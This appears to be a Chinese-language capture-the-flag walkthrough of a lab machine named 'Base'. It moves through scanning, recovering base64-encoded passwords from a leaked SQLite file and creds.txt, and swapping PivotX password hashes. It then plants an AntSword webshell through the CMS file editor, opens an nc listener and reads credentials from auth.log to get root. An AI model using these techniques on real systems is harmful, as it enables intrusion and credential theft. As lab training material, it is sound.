![image-20250724102315597](http://7r1UMPHK.github.io/image/20250724102323560.webp)

浅浅娱乐一下

```
┌──(kali㉿kali)-[/mnt/hgfs/gx/x]
└─$ sudo arp-scan -l          
[sudo] kali 的密码：
Interface: eth0, type: EN10MB, MAC: 00:0c:29:57:e5:45, IPv4: 192.168.205.128
Starting arp-scan 1.10.0 with 256 hosts (https://github.com/royhills/arp-scan)
192.168.205.1   00:50:56:c0:00:08       VMware, Inc.
192.168.205.2   00:50:56:fc:94:2f       VMware, Inc.
192.168.205.210 08:00:27:5d:66:94       PCS Systemtechnik GmbH
192.168.205.254 00:50:56:fc:a8:ce       VMware, Inc.

4 packets received by filter, 0 packets dropped by kernel
Ending arp-scan 1.10.0: 256 hosts scanned in 1.965 seconds (130.28 hosts/sec). 4 responded
```

192.168.205.210的ip

```
┌──(kali㉿kali)-[/mnt/hgfs/gx/x]
└─$ nmap -p- 192.168.205.210
Starting Nmap 7.95 ( https://nmap.org ) at 2025-07-23 22:24 EDT
Nmap scan report for 192.168.205.210
Host is up (0.00034s latency).
Not shown: 65533 closed tcp ports (reset)
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http
MAC Address: 08:00:27:5D:66:94 (PCS Systemtechnik/Oracle VirtualBox virtual NIC)

Nmap done: 1 IP address (1 host up) scanned in 1.26 seconds
```

看80端口
![image-20250724102447816](http://7r1UMPHK.github.io/image/20250724102448088.webp)

看到了版本号，但是这个靶机不是打那个，所以不用管

进行目录爆破

```
┌──(kali㉿kali)-[/mnt/hgfs/gx/x]
└─$ gobuster dir -u http://192.168.205.210 -w /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -x php,txt,html,zip,db -t 64 
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://192.168.205.210
[+] Method:                  GET
[+] Threads:                 64
[+] Wordlist:                /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Extensions:              php,txt,html,zip,db
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/.html                (Status: 403) [Size: 280]
/images               (Status: 301) [Size: 319] [--> http://192.168.205.210/images/]
/.php                 (Status: 403) [Size: 280]
/index.php            (Status: 200) [Size: 9329]
/users.db             (Status: 200) [Size: 12288]
/robots.txt           (Status: 200) [Size: 33]
/LICENSE.txt          (Status: 200) [Size: 14900]
/.html                (Status: 403) [Size: 280]
/.php                 (Status: 403) [Size: 280]
/UPGRADE.txt          (Status: 200) [Size: 956]
Progress: 461907 / 1323360 (34.90%)^C
[!] Keyboard interrupt detected, terminating.
Progress: 462062 / 1323360 (34.92%)
===============================================================
Finished
===============================================================
```

感兴趣的有`robots.txt`、`user.db`

```
┌──(kali㉿kali)-[/mnt/hgfs/gx/x/tmp]
└─$ curl 192.168.205.210/robots.txt                                           
User-agent: *
Disallow: /pivotx/
```

这个应该是cms的主页暂时不管

```
┌──(kali㉿kali)-[/mnt/hgfs/gx/x/tmp]
└─$ wget http://192.168.205.210/users.db
--2025-07-23 22:27:37--  http://192.168.205.210/users.db
正在连接 192.168.205.210:80... 已连接。
已发出 HTTP 请求，正在等待回应... 200 OK
长度：12288 (12K)
正在保存至: “users.db”

users.db                                  100%[=====================================================================================>]  12.00K  --.-KB/s  用时 0s      

2025-07-23 22:27:37 (703 MB/s) - 已保存 “users.db” [12288/12288])

                                                                                                                                                                        
┌──(kali㉿kali)-[/mnt/hgfs/gx/x/tmp]
└─$ file users.db 
users.db: SQLite 3.x database, last written using SQLite version 3027002, file counter 2, database pages 3, cookie 0x1, schema 4, UTF-8, version-valid-for 2
                                                   
┌──(kali㉿kali)-[/mnt/hgfs/gx/x/tmp]
└─$ file users.db 
users.db: SQLite 3.x database, last written using SQLite version 3027002, file counter 2, database pages 3, cookie 0x1, schema 4, UTF-8, version-valid-for 2
           
┌──(kali㉿kali)-[/mnt/hgfs/gx/x/tmp]
└─$ sqlite3 users.db                   
SQLite version 3.46.1 2024-08-13 09:16:08
Enter ".help" for usage hints.
sqlite> .tables
users
sqlite> select * from users;
1|hungry|aHVuZ3J5
```

`aHVuZ3J5`是hungry的base64编码

去找找登录口

发现打开`/pivotx/`就会跳转登录

尝试登录无果，去尝试ssh

```
┌──(kali㉿kali)-[/mnt/hgfs/gx/x/tmp]
└─$ ssh hungry@192.168.205.210                                                                                                                   
The authenticity of host '192.168.205.210 (192.168.205.210)' can't be established.
ED25519 key fingerprint is SHA256:O2iH79i8PgOwV/Kp8ekTYyGMG8iHT+YlWuYC85SbWSQ.
Linux Base 4.19.0-27-amd64 #1 SMP Debian 4.19.316-1 (2024-06-25) x86_64

The programs included with the Debian GNU/Linux system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
permitted by applicable law.
 ____                 
| __ )  __ _ ___  ___ 
|  _ \ / _` / __|/ _ \
| |_) | (_| \__ \  __/
|____/ \__,_|___/\___|
                      
hungry@Base:~$ id
uid=1000(hungry) gid=1000(hungry) groups=1000(hungry)
```

登录成功，这里有两个思路

第一个，你可以根据靶机名字base和ssh登录密码发现规律，它使用的密码及其有可能是经过base64编码的，所以你可以将一些字典编码生成有针对性的字典
```
while IFS= read -r line; do
    echo -n "$line" | base64
done < xato-net-10-million-passwords-100000.txt  > 100000base.txt
```

这里为什么使用`xato-net-10-million-passwords-100000.txt`是因为我发现好像我们常见的弱密码在`xato`里面是比较前的，而`rockyou`比较后面，如`admin123`

密码是todd的base64编码，在`xato`的5k+，在`rockyou`的13w左右

第二个方法是横向回www-data

```
hungry@Base:~$ id www-data
uid=33(www-data) gid=33(www-data) groups=33(www-data),4(adm)
```

它有一个`adm`组权限，这个权限可以看log日志文件

```
hungry@Base:~$ cd /var/www/html/
hungry@Base:/var/www/html$ ls -al
total 76
drwxr-xr-x  4 root     root      4096 Jul 20 00:52 .
drwxr-xr-x  3 root     root      4096 Apr  4 23:20 ..
-rw-r--r--  1 www-data www-data    27 Jul 20 00:24 creds.txt
-rw-r--r--  1 www-data www-data  3389 Jun 22  2023 example.htaccess
-rw-r--r--  1 www-data www-data  4253 Jun 22  2023 example.web.config
drwxr-xr-x  2 www-data www-data  4096 Jun 22  2023 images
-rw-r--r--  1 www-data www-data   612 Jun 22  2023 index.php
-rw-r--r--  1 www-data www-data 14900 Jun 22  2023 LICENSE.txt
drwxr-xr-x 12 www-data www-data  4096 Jun 22  2023 pivotx
-rw-r--r--  1 www-data www-data   311 Jun 22  2023 README.md
-rw-r--r--  1 www-data www-data    33 Jun 22  2023 robots.txt
-rw-r--r--  1 www-data www-data   956 Jun 22  2023 UPGRADE.txt
-rw-r--r--  1 root     root     12288 Jul 20 00:30 users.db
hungry@Base:/var/www/html$ cat creds.txt 
guest:guest
admin:YWRtaW*=
```

一个是访客密码，没有结果base64编码，一个是admin管理员用户的密码，经过了base64编码，这里就考验你有没有看过base64的`admin`了，当然你爆破也是可以的。web有爆破限制，可以去扒拉`/db/user`文件拿`hash`爆破

```
hungry@Base:/var/www/html$ cd pivotx/db/
hungry@Base:/var/www/html/pivotx/db$ ls -al
total 96
drwxr-xr-x 11 www-data www-data 4096 Jul 20 00:25 .
drwxr-xr-x 12 www-data www-data 4096 Jun 22  2023 ..
drwxrwxrwx  2 www-data www-data 4096 Jul 20 00:25 cache
-rw-r--r--  1 www-data www-data  202 Jun 22  2023 index.html
drwxrwxrwx  2 www-data www-data 4096 Jul 20 00:08 pages
drwxr-xr-x  2 www-data www-data 4096 Jun 22  2023 refkeys
drwxr-xr-x  2 www-data www-data 4096 Jun 22  2023 rsscache
drwxr-xr-x  2 www-data www-data 4096 Jul 20 00:08 search
-rw-rw-rw-  1 www-data www-data  268 Jul 20 00:25 ser-archives.php
-rw-rw-rw-  1 www-data www-data  309 Jul 20 00:09 ser_categories.php
-rw-rw-rw-  1 www-data www-data   90 Jul 20 00:08 ser-cats.php
-rw-rw-rw-  1 www-data www-data 2729 Jul 20 00:08 ser_config.php
-rw-rw-rw-  1 www-data www-data   95 Jul 20 00:08 ser-dates.php
-rw-rw-rw-  1 www-data www-data  389 Jul 20 00:09 ser_events.php
-rw-rw-rw-  1 www-data www-data  165 Jul 20 00:08 ser_logins.php
-rw-rw-rw-  1 www-data www-data  148 Jul 20 00:08 ser_sessions.php
-rw-rw-rw-  1 www-data www-data  118 Jul 23 22:29 ser_tags.php
-rw-rw-rw-  1 www-data www-data  117 Jul 20 00:08 ser-uris.php
-rw-rw-rw-  1 www-data www-data  604 Jul 20 00:09 ser_users.php
-rw-rw-rw-  1 www-data www-data 2692 Jul 23 22:29 ser_weblogs.php
drwxrwxrwx  2 www-data www-data 4096 Jul 20 00:08 standard-00000
drwxr-xr-x  2 www-data www-data 4096 Jul 20 00:08 tagdata
drwxr-xr-x  2 www-data www-data 4096 Jun 22  2023 tbkeys
drwxr-xr-x  2 www-data www-data 4096 Jun 22  2023 users
hungry@Base:/var/www/html/pivotx/db$ cat ser_users.php
<?php /* pivot */ die(); ?>a:2:{i:0;a:10:{s:8:"username";s:5:"admin";s:5:"email";s:15:"admin@admin.com";s:9:"userlevel";i:4;s:8:"nickname";s:4:"root";s:8:"language";s:2:"en";s:5:"image";N;s:15:"text_processing";i:5;s:4:"salt";s:6:"phpass";s:8:"password";s:34:"$P$C4HR7UH4rgIvtiTUko9sm5X2wnXvVe1";s:8:"lastseen";i:1752984498;}i:1;a:9:{s:8:"username";s:5:"guest";s:5:"email";s:15:"guest@admin.com";s:9:"userlevel";s:1:"1";s:8:"nickname";s:5:"guest";s:8:"language";s:2:"en";s:5:"image";s:0:"";s:15:"text_processing";s:1:"5";s:4:"salt";s:6:"phpass";s:8:"password";s:34:"$P$CKuO3Fs4IYzSqVFJi1TCLNSXd3yCaK1";}}
```

或者你直接不爆破了，直接替换`admin`的hash为`guest`的hash，因为`ser_users.php`文件我们有写入的权限，看你喜欢

进去cms之后，在`http://192.168.205.210/pivotx/index.php?page=homeexplore`管理文件页面，直接修改

index.php的内容为蚁剑的ant文件就好了（直接修改成reverce shell和cmd好像不行，它好像有些过滤。或者你根据那个rce的修改，那个是可以的）

kali监听

```
┌──(kali㉿kali)-[/mnt/hgfs/gx/x]
└─$ nc -lvnp 8888           
listening on [any] 8888 ...
```

使用蚁剑连接，弹shell

稳定shell

```
script /dev/null -c bash
Ctrl+Z
stty raw -echo; fg
reset xterm  
export TERM=xterm  
export SHELL=/bin/bash  
stty rows 24 columns 80
```

直接扒拉日志

```
www-data@Base:/var/www/html$ id
uid=33(www-data) gid=33(www-data) groups=33(www-data),4(adm)
www-data@Base:/var/www/html$ cd /var/log
www-data@Base:/var/log$ grep -i -r "password\|pass\|passwd" auth.log 
Jul 19 23:59:05 moban passwd[528]: pam_unix(passwd:chauthtok): password changed for root
Jul 19 23:58:27 moban sudo[381]: root : password changed to 'dG9kZA==
Jul 20 00:05:17 moban sshd[548]: Accepted password for root from 192.168.3.94 port 60280 ssh2
Jul 20 00:10:50 moban passwd[831]: pam_unix(passwd:chauthtok): password changed for hungry
Jul 20 00:30:55 moban passwd[1026]: pam_unix(passwd:chauthtok): password changed for hungry
Jul 20 00:31:43 moban sshd[1031]: Accepted password for root from 192.168.3.94 port 36218 ssh2
Jul 20 00:32:02 moban passwd[1044]: pam_unix(passwd:chauthtok): password changed for root
Jul 20 00:44:17 Base sshd[433]: Accepted password for root from 192.168.3.94 port 47964 ssh2
Jul 20 00:52:12 Base sshd[433]: Accepted password for root from 192.168.3.94 port 55854 ssh2
Jul 23 22:30:22 Base sshd[583]: Accepted password for hungry from 192.168.205.128 port 34874 ssh2
```

dG9kZA==

登录一下

```
www-data@Base:/var/log$ su -
Password: 
 ____                 
| __ )  __ _ ___  ___ 
|  _ \ / _` / __|/ _ \
| |_) | (_| \__ \  __/
|____/ \__,_|___/\___|
                      
root@Base:~# cat /root/root.txt /home/hungry/user.txt 
flag{root}
flag{user-051a0db9a92e4dacc70212da32fd0638}
```

